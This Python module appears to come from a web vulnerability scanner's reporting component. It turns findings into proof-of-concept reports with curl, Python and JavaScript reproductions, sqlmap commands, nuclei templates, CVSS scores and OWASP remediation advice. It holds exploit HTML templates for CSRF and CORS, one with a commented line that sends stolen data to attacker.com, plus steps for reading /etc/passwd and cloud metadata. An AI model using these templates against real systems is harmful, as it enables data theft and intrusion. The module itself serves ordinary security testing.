import json
import re
import html
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from urllib.parse import urlparse, urlencode, quote
from datetime import datetime


@dataclass
class CVSSScore:
    score: float
    severity: str
    vector: str
    breakdown: Dict[str, str] = field(default_factory=dict)
    
    def to_dict(self) -> dict:
        return {
            "score": self.score,
            "severity": self.severity,
            "vector": self.vector,
            "breakdown": self.breakdown,
        }


@dataclass
class ProofOfConcept:
    finding: dict
    curl_command: str
    python_code: str
    javascript_code: str
    raw_request: str
    raw_response: str
    exploit_html: Optional[str]
    sqlmap_command: Optional[str]
    nuclei_template: Optional[str]
    cvss: CVSSScore
    remediation: str
    references: List[str]
    reproduction_steps: List[str]
    
    def to_dict(self) -> dict:
        return {
            "finding": self.finding,
            "curl_command": self.curl_command,
            "python_code": self.python_code,
            "javascript_code": self.javascript_code,
            "raw_request": self.raw_request,
            "raw_response": self.raw_response,
            "exploit_html": self.exploit_html,
            "sqlmap_command": self.sqlmap_command,
            "nuclei_template": self.nuclei_template,
            "cvss": self.cvss.to_dict(),
            "remediation": self.remediation,
            "references": self.references,
            "reproduction_steps": self.reproduction_steps,
        }
    
    def to_markdown(self) -> str:
        md = f"""## {self.finding.get('description', 'Vulnerability')}

**Severity:** {self.finding.get('severity', 'UNKNOWN')}
**CVSS Score:** {self.cvss.score} ({self.cvss.severity})
**CVSS Vector:** `{self.cvss.vector}`
**Confidence:** {self.finding.get('confidence', 'N/A')}

### Affected Endpoint
- **URL:** `{self.finding.get('url', 'N/A')}`
- **Parameter:** `{self.finding.get('parameter', 'N/A')}`
- **Module:** {self.finding.get('module', 'N/A')}

### Reproduction Steps
"""
        for i, step in enumerate(self.reproduction_steps, 1):
            md += f"{i}. {step}\n"
        
        md += f"""
### Proof of Concept

**curl:**
```bash
{self.curl_command}
```

**Python:**
```python
{self.python_code}
```
"""
        
        if self.exploit_html:
            md += f"""
**Exploit HTML:**
```html
{self.exploit_html}
```
"""
        
        if self.sqlmap_command:
            md += f"""
**sqlmap:**
```bash
{self.sqlmap_command}
```
"""
        
        md += f"""
### Evidence

**Request:**
```http
{self.raw_request[:2000]}
```

**Response:**
```http
{self.raw_response[:2000]}
```

### Remediation
{self.remediation}

### References
"""
        for ref in self.references:
            md += f"- {ref}\n"
        
        return md


CVSS_BASE_SCORES = {
    "sqli": {"score": 9.8, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    "xss": {"score": 6.1, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"},
    "ssrf": {"score": 9.1, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"},
    "xxe": {"score": 7.5, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"},
    "ssti": {"score": 9.8, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    "lfi": {"score": 7.5, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"},
    "rfi": {"score": 9.8, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    "cmdi": {"score": 9.8, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    "upload": {"score": 9.8, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    "idor": {"score": 6.5, "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"},
    "csrf": {"score": 4.3, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N"},
    "cors": {"score": 5.3, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"},
    "redirect": {"score": 4.7, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N"},
    "jwt": {"score": 7.5, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"},
    "auth": {"score": 7.5, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"},
    "deserial": {"score": 9.8, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    "ldap": {"score": 9.8, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
    "smuggle": {"score": 9.1, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"},
    "cachepois": {"score": 7.5, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"},
    "crlf": {"score": 6.1, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"},
    "default": {"score": 5.0, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"},
}

REMEDIATION_DB = {
    "sqli": {
        "title": "SQL Injection",
        "remediation": """1. Use parameterized queries (prepared statements) for all database operations
2. Use ORM frameworks that handle escaping automatically
3. Implement input validation with strict whitelisting
4. Apply the principle of least privilege to database accounts
5. Enable database query logging and monitoring""",
        "references": [
            "https://owasp.org/www-community/attacks/SQL_Injection",
            "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/89.html",
        ],
    },
    "xss": {
        "title": "Cross-Site Scripting",
        "remediation": """1. Encode all user-controlled output based on context (HTML, JavaScript, URL, CSS)
2. Implement Content-Security-Policy headers with strict directives
3. Use HTTPOnly and Secure flags on session cookies
4. Validate and sanitize input with libraries like DOMPurify
5. Use modern frameworks with automatic XSS protection""",
        "references": [
            "https://owasp.org/www-community/attacks/xss/",
            "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/79.html",
        ],
    },
    "ssrf": {
        "title": "Server-Side Request Forgery",
        "remediation": """1. Whitelist allowed domains and protocols for external requests
2. Block requests to internal IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
3. Disable unnecessary URL schemes (file://, gopher://, dict://)
4. Use DNS resolution validation to prevent DNS rebinding
5. Implement network segmentation for internal services""",
        "references": [
            "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
            "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/918.html",
        ],
    },
    "xxe": {
        "title": "XML External Entity Injection",
        "remediation": """1. Disable external entity processing in XML parsers
2. Use defusedxml or similar secure XML parsing libraries
3. Disable DTD processing if not required
4. Validate and sanitize XML input
5. Use less complex data formats like JSON where possible""",
        "references": [
            "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
            "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/611.html",
        ],
    },
    "ssti": {
        "title": "Server-Side Template Injection",
        "remediation": """1. Never pass user input directly to template engines
2. Use sandboxed template environments
3. Implement strict input validation
4. Use logic-less templates where possible
5. Keep template engines updated""",
        "references": [
            "https://portswigger.net/web-security/server-side-template-injection",
            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection",
            "https://cwe.mitre.org/data/definitions/94.html",
        ],
    },
    "cmdi": {
        "title": "Command Injection",
        "remediation": """1. Avoid using shell commands with user input
2. Use language-specific APIs instead of shell commands
3. If shell is necessary, use parameterized commands (subprocess with list)
4. Implement strict input validation with whitelisting
5. Run commands with minimal privileges""",
        "references": [
            "https://owasp.org/www-community/attacks/Command_Injection",
            "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/78.html",
        ],
    },
    "lfi": {
        "title": "Local File Inclusion",
        "remediation": """1. Never use user input directly in file paths
2. Implement a whitelist of allowed files
3. Use indirect references (e.g., IDs mapping to files)
4. Sanitize path traversal sequences (../, ..\\)
5. Chroot or sandbox file operations""",
        "references": [
            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
            "https://cwe.mitre.org/data/definitions/98.html",
        ],
    },
    "upload": {
        "title": "File Upload Vulnerability",
        "remediation": """1. Validate file type by content (magic bytes), not extension
2. Generate random filenames on server
3. Store uploads outside web root
4. Set restrictive permissions on upload directory
5. Scan uploaded files for malware
6. Implement size limits""",
        "references": [
            "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
            "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/434.html",
        ],
    },
    "idor": {
        "title": "Insecure Direct Object Reference",
        "remediation": """1. Implement proper authorization checks on every resource access
2. Use indirect references (e.g., user-specific IDs)
3. Validate that the requesting user owns/has access to the resource
4. Log and monitor access to sensitive resources
5. Implement access control lists""",
        "references": [
            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References",
            "https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/639.html",
        ],
    },
    "default": {
        "title": "Security Vulnerability",
        "remediation": """1. Review and validate all user input
2. Implement proper access controls
3. Keep all software and dependencies updated
4. Follow security best practices for your framework
5. Conduct regular security assessments""",
        "references": [
            "https://owasp.org/www-project-top-ten/",
            "https://cwe.mitre.org/",
        ],
    },
}


class PoCGenerator:
    def __init__(self):
        self.cvss_db = CVSS_BASE_SCORES
        self.remediation_db = REMEDIATION_DB
    
    def generate(self, finding: dict, request_data: dict = None, response_data: dict = None) -> ProofOfConcept:
        module = finding.get("module", "default").lower()
        
        request_data = request_data or {}
        response_data = response_data or {}
        
        curl_cmd = self._generate_curl(finding, request_data)
        python_code = self._generate_python(finding, request_data)
        js_code = self._generate_javascript(finding, request_data)
        raw_request = self._format_raw_request(finding, request_data)
        raw_response = self._format_raw_response(response_data)
        exploit_html = self._generate_exploit_html(finding, module)
        sqlmap_cmd = self._generate_sqlmap(finding) if module == "sqli" else None
        nuclei = self._generate_nuclei_template(finding, module)
        cvss = self._calculate_cvss(finding)
        remediation = self._get_remediation(module)
        references = self._get_references(module)
        steps = self._generate_reproduction_steps(finding, module)
        
        return ProofOfConcept(
            finding=finding,
            curl_command=curl_cmd,
            python_code=python_code,
            javascript_code=js_code,
            raw_request=raw_request,
            raw_response=raw_response,
            exploit_html=exploit_html,
            sqlmap_command=sqlmap_cmd,
            nuclei_template=nuclei,
            cvss=cvss,
            remediation=remediation,
            references=references,
            reproduction_steps=steps,
        )
    
    def _generate_curl(self, finding: dict, request_data: dict) -> str:
        url = finding.get("url", "https://target.com/")
        method = request_data.get("method", "GET").upper()
        headers = request_data.get("headers", {})
        data = request_data.get("data")
        json_data = request_data.get("json")
        
        cmd_parts = ["curl"]
        
        if method != "GET":
            cmd_parts.append(f"-X {method}")
        
        for header, value in headers.items():
            if header.lower() not in ["host", "content-length"]:
                escaped_value = value.replace("'", "'\\''")
                cmd_parts.append(f"-H '{header}: {escaped_value}'")
        
        if json_data:
            cmd_parts.append("-H 'Content-Type: application/json'")
            json_str = json.dumps(json_data).replace("'", "'\\''")
            cmd_parts.append(f"-d '{json_str}'")
        elif data:
            if isinstance(data, dict):
                data_str = urlencode(data)
            else:
                data_str = str(data)
            escaped_data = data_str.replace("'", "'\\''")
            cmd_parts.append(f"-d '{escaped_data}'")
        
        cmd_parts.append(f"'{url}'")
        
        return " \\\n  ".join(cmd_parts)
    
    def _generate_python(self, finding: dict, request_data: dict) -> str:
        url = finding.get("url", "https://target.com/")
        method = request_data.get("method", "GET").lower()
        headers = request_data.get("headers", {})
        data = request_data.get("data")
        json_data = request_data.get("json")
        
        code = """import requests

url = {url!r}
headers = {headers}
""".format(url=url, headers=json.dumps(headers, indent=4) if headers else "{}")
        
        if json_data:
            code += f"""
payload = {json.dumps(json_data, indent=4)}

response = requests.{method}(url, headers=headers, json=payload, verify=False)
"""
        elif data:
            code += f"""
data = {json.dumps(data, indent=4) if isinstance(data, dict) else repr(data)}

response = requests.{method}(url, headers=headers, data=data, verify=False)
"""
        else:
            code += f"""
response = requests.{method}(url, headers=headers, verify=False)
"""
        
        code += """
print(f"Status: {response.status_code}")
print(f"Headers: {dict(response.headers)}")
print(f"Body: {response.text[:500]}")
"""
        return code
    
    def _generate_javascript(self, finding: dict, request_data: dict) -> str:
        url = finding.get("url", "https://target.com/")
        method = request_data.get("method", "GET").upper()
        headers = request_data.get("headers", {})
        data = request_data.get("data")
        json_data = request_data.get("json")
        
        headers_js = json.dumps(headers) if headers else "{}"
        
        if json_data:
            body_js = f"JSON.stringify({json.dumps(json_data)})"
            headers_js = json.dumps({**headers, "Content-Type": "application/json"})
        elif data:
            if isinstance(data, dict):
                body_js = f"new URLSearchParams({json.dumps(data)}).toString()"
            else:
                body_js = repr(data)
        else:
            body_js = "null"
        
        code = f"""fetch('{url}', {{
    method: '{method}',
    headers: {headers_js},
    body: {body_js},
    credentials: 'include'
}})
.then(response => response.text())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));
"""
        return code
    
    def _format_raw_request(self, finding: dict, request_data: dict) -> str:
        url = finding.get("url", "/")
        parsed = urlparse(url)
        method = request_data.get("method", "GET").upper()
        headers = request_data.get("headers", {})
        data = request_data.get("data")
        json_data = request_data.get("json")
        
        path = parsed.path or "/"
        if parsed.query:
            path += f"?{parsed.query}"
        
        request = f"{method} {path} HTTP/1.1\r\n"
        request += f"Host: {parsed.netloc}\r\n"
        
        for header, value in headers.items():
            if header.lower() != "host":
                request += f"{header}: {value}\r\n"
        
        body = ""
        if json_data:
            body = json.dumps(json_data)
            request += "Content-Type: application/json\r\n"
        elif data:
            body = urlencode(data) if isinstance(data, dict) else str(data)
            request += "Content-Type: application/x-www-form-urlencoded\r\n"
        
        if body:
            request += f"Content-Length: {len(body)}\r\n"
        
        request += "\r\n"
        
        if body:
            request += body
        
        return request
    
    def _format_raw_response(self, response_data: dict) -> str:
        status = response_data.get("status", 200)
        headers = response_data.get("headers", {})
        body = response_data.get("text", "")
        
        response = f"HTTP/1.1 {status} OK\r\n"
        
        for header, value in headers.items():
            response += f"{header}: {value}\r\n"
        
        response += "\r\n"
        response += body[:2000]
        
        if len(body) > 2000:
            response += "\n... [truncated]"
        
        return response
    
    def _generate_exploit_html(self, finding: dict, module: str) -> Optional[str]:
        url = finding.get("url") or ""
        param = finding.get("parameter") or ""
        evidence = finding.get("evidence") or ""
        
        if module == "xss":
            return f"""<!DOCTYPE html>
<html>
<head><title>XSS PoC</title></head>
<body>
<h1>XSS Proof of Concept</h1>
<p>Target: {html.escape(url)}</p>
<p>Parameter: {html.escape(param)}</p>
<iframe src="{html.escape(url)}" width="800" height="600"></iframe>
<script>
// Alternative: redirect-based PoC
// window.location = "{html.escape(url)}";
</script>
</body>
</html>"""
        
        elif module == "csrf":
            return f"""<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
<h1>CSRF Proof of Concept</h1>
<form id="csrf-form" action="{html.escape(url)}" method="POST">
    <!-- Add form fields based on the vulnerable endpoint -->
    <input type="hidden" name="param" value="malicious_value" />
</form>
<script>
    // Auto-submit on page load
    document.getElementById('csrf-form').submit();
</script>
</body>
</html>"""
        
        elif module == "cors":
            return f"""<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<h1>CORS Proof of Concept</h1>
<div id="result"></div>
<script>
fetch('{url}', {{
    credentials: 'include'
}})
.then(response => response.text())
.then(data => {{
    document.getElementById('result').innerText = data;
    // Exfiltrate: fetch('https://attacker.com/log?data=' + btoa(data));
}});
</script>
</body>
</html>"""
        
        elif module == "redirect":
            return f"""<!DOCTYPE html>
<html>
<head><title>Open Redirect PoC</title></head>
<body>
<h1>Open Redirect Proof of Concept</h1>
<p>Click the link below to test the redirect:</p>
<a href="{html.escape(url)}">Click here</a>
<p>This should redirect to an attacker-controlled domain.</p>
</body>
</html>"""
        
        return None
    
    def _generate_sqlmap(self, finding: dict) -> str:
        url = finding.get("url", "")
        param = finding.get("parameter", "")
        
        cmd = f"sqlmap -u \"{url}\""
        
        if param:
            cmd += f" -p {param}"
        
        cmd += " --batch --risk=3 --level=5"
        
        return cmd
    
    def _generate_nuclei_template(self, finding: dict, module: str) -> str:
        url = finding.get("url", "")
        parsed = urlparse(url)
        path = parsed.path or "/"
        
        template = f"""id: lantern-{module}-{finding.get('id', 'custom')[:8]}
info:
  name: {finding.get('description', module.upper() + ' Vulnerability')[:50]}
  author: lantern
  severity: {finding.get('severity', 'medium').lower()}
  description: Auto-generated template from Lantern scan
  tags: {module},lantern

http:
  - method: GET
    path:
      - "{{{{BaseURL}}}}{path}"
    matchers:
      - type: status
        status:
          - 200
"""
        return template
    
    def _calculate_cvss(self, finding: dict) -> CVSSScore:
        module = finding.get("module", "default").lower()
        severity = finding.get("severity", "MEDIUM")
        confidence = finding.get("confidence", "MEDIUM")
        
        base = self.cvss_db.get(module, self.cvss_db["default"])
        score = base["score"]
        
        severity_mult = {
            "CRITICAL": 1.0,
            "HIGH": 0.9,
            "MEDIUM": 0.7,
            "LOW": 0.5,
            "INFO": 0.3,
        }.get(severity, 0.7)
        
        confidence_mult = {
            "CONFIRMED": 1.0,
            "HIGH": 0.95,
            "MEDIUM": 0.85,
            "LOW": 0.7,
        }.get(confidence, 0.85)
        
        adjusted = score * severity_mult * confidence_mult
        adjusted = round(min(adjusted, 10.0), 1)
        
        if adjusted >= 9.0:
            severity_label = "CRITICAL"
        elif adjusted >= 7.0:
            severity_label = "HIGH"
        elif adjusted >= 4.0:
            severity_label = "MEDIUM"
        elif adjusted > 0:
            severity_label = "LOW"
        else:
            severity_label = "INFO"
        
        return CVSSScore(
            score=adjusted,
            severity=severity_label,
            vector=base["vector"],
            breakdown={
                "base_score": base["score"],
                "severity_multiplier": severity_mult,
                "confidence_multiplier": confidence_mult,
            },
        )
    
    def _get_remediation(self, module: str) -> str:
        data = self.remediation_db.get(module, self.remediation_db["default"])
        return f"**{data['title']}**\n\n{data['remediation']}"
    
    def _get_references(self, module: str) -> List[str]:
        data = self.remediation_db.get(module, self.remediation_db["default"])
        return data.get("references", [])
    
    def _generate_reproduction_steps(self, finding: dict, module: str) -> List[str]:
        url = finding.get("url", "N/A")
        param = finding.get("parameter", "N/A")
        evidence = finding.get("evidence", "")
        
        steps = [
            f"Navigate to or send a request to: {url}",
        ]
        
        if param and param != "N/A":
            steps.append(f"Identify the vulnerable parameter: {param}")
        
        module_steps = {
            "sqli": [
                "Inject a SQL payload into the parameter",
                "Observe the response for SQL errors or data extraction",
                "Use tools like sqlmap to automate exploitation",
            ],
            "xss": [
                "Inject an XSS payload (e.g., <script>alert(1)</script>)",
                "Observe if the payload is reflected without encoding",
                "Check if the script executes in the browser",
            ],
            "ssrf": [
                "Provide an internal URL or callback URL as input",
                "Check for interaction with internal services",
                "Attempt to access cloud metadata endpoints",
            ],
            "lfi": [
                "Use path traversal sequences (../) in the file parameter",
                "Attempt to read known files like /etc/passwd",
                "Try PHP wrappers if applicable (php://filter)",
            ],
        }
        
        steps.extend(module_steps.get(module, [
            "Send the malicious payload as shown in the PoC",
            "Observe the application response",
            "Verify the vulnerability is exploitable",
        ]))
        
        if evidence:
            steps.append(f"Expected evidence: {evidence[:100]}")
        
        return steps


def create_poc_generator() -> PoCGenerator:
    return PoCGenerator()


def generate_poc(finding: dict, request: dict = None, response: dict = None) -> ProofOfConcept:
    generator = PoCGenerator()
    return generator.generate(finding, request, response)
